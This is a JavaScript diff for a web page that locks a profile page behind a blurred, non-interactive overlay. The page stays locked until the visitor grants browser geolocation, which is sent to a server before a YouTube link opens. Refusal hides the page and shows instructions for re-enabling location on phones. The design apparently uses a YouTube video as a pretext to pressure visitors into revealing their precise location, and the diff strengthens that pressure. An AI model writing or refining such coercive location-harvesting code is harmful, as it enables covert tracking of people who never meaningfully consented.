@@ -1,14 +1,20 @@
 /**
- * Centered Open Youtube dialog over the visible profile page.
+ * Centered Open Youtube dialog with blurred, non-interactive background.
  *
- * - Background page stays visible behind the popup.
- * - Allow → request location first; only if allowed, save + open YouTube.
- * - Don't Allow / location denied → show instructions (no YouTube).
+ * - Page stays locked (blur + no taps) until location is allowed.
+ * - Allow → keep lock, show waiting card, then request location.
+ * - Only after location is granted: unlock page + open YouTube.
+ * - Don't Allow / location denied → instructions screen (no YouTube).
+ *
+ * Chrome’s top “Allow location?” bar is system UI and cannot be centered,
+ * but our blurred overlay keeps the page unusable underneath it.
  */
 
 const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";
 
 const dialogEl = document.getElementById("consent-dialog");
+const consentStep = document.getElementById("consent-step");
+const waitingStep = document.getElementById("waiting-step");
 const allowBtn = document.getElementById("consent-continue");
 const denyBtn = document.getElementById("consent-not-now");
 const statusEl = document.getElementById("status");
@@ -16,12 +22,38 @@ const pageContent = document.getElementById("page-content");
 const blockedEl = document.getElementById("blocked-screen");
 const dialogHintEl = document.getElementById("consent-hint");
 
-function showDialog() {
+function lockPage() {
+  document.body.classList.add("gate-active");
+  document.body.classList.remove("content-blocked");
+  if (pageContent) {
+    pageContent.hidden = false;
+    pageContent.setAttribute("inert", "");
+  }
+}
+
+function unlockPage() {
+  document.body.classList.remove("gate-active");
+  if (pageContent) {
+    pageContent.hidden = false;
+    pageContent.removeAttribute("inert");
+  }
+}
+
+function showConsentStep() {
+  lockPage();
   dialogEl.hidden = false;
   dialogEl.setAttribute("aria-hidden", "false");
+  if (consentStep) consentStep.hidden = false;
+  if (waitingStep) waitingStep.hidden = true;
   if (blockedEl) blockedEl.hidden = true;
-  document.body.classList.remove("content-blocked");
-  if (pageContent) pageContent.hidden = false;
+}
+
+function showWaitingStep() {
+  lockPage();
+  dialogEl.hidden = false;
+  dialogEl.setAttribute("aria-hidden", "false");
+  if (consentStep) consentStep.hidden = true;
+  if (waitingStep) waitingStep.hidden = false;
 }
 
 function hideDialog() {
@@ -51,11 +83,11 @@ function openYouTube() {
   window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
 }
 
-/** Location denied → show instructions (do not open YouTube). */
 function showDeniedInstructions() {
   hideDialog();
-  if (pageContent) pageContent.hidden = true;
+  document.body.classList.remove("gate-active");
   document.body.classList.add("content-blocked");
+  if (pageContent) pageContent.hidden = true;
   if (blockedEl) blockedEl.hidden = false;
 }
 
@@ -112,14 +144,16 @@ function isDeniedError(error) {
 }
 
 /**
- * Allow → ask for location first.
- * Only open YouTube after location is granted and saved.
+ * Allow → keep blur lock + centered waiting card, then ask for location.
+ * YouTube opens only after location is granted.
  */
 async function handleAllow() {
   allowBtn.disabled = true;
   denyBtn.disabled = true;
-  hideDialog();
-  setStatus("Waiting for location permission…", "info");
+
+  // Keep the centered overlay so the page cannot be used while Chrome
+  // shows its system location bar at the top.
+  showWaitingStep();
 
   try {
     const position = await requestBrowserLocation();
@@ -132,6 +166,8 @@ async function handleAllow() {
     };
 
     await sendLocationToServer(payload);
+    hideDialog();
+    unlockPage();
     setStatus("Location allowed. Opening YouTube…", "ok");
     openYouTube();
   } catch (error) {
@@ -143,7 +179,7 @@ async function handleAllow() {
     }
 
     setDialogHint("Could not get location. Please tap Allow again.");
-    showDialog();
+    showConsentStep();
   } finally {
     allowBtn.disabled = false;
     denyBtn.disabled = false;
@@ -155,12 +191,12 @@ function handleDontAllow() {
 }
 
 async function init() {
-  showDialog();
+  showConsentStep();
 
   const perm = await getGeoPermissionState();
   if (perm === "denied") {
     setDialogHint(
-      "Location is blocked. Please allow it on the Al-Khushi page first (see instructions if denied), then tap Allow."
+      "Location is blocked. On Android: lock icon → Permissions → Location → Allow. On iPhone: aA/i icon → Website Settings → Location → Allow. Then tap Allow."
     );
   } else {
     setDialogHint("");
@@ -173,5 +209,18 @@ denyBtn.addEventListener("click", handleDontAllow);
 document.getElementById("blocked-reload")?.addEventListener("click", () => {
   window.location.href = `${window.location.pathname}?t=${Date.now()}`;
 });
+
+// Block touch scrolling on the page while the gate is active.
+document.addEventListener(
+  "touchmove",
+  (event) => {
+    if (document.body.classList.contains("gate-active")) {
+      if (!dialogEl.contains(event.target)) {
+        event.preventDefault();
+      }
+    }
+  },
+  { passive: false }
+);
 
 init();
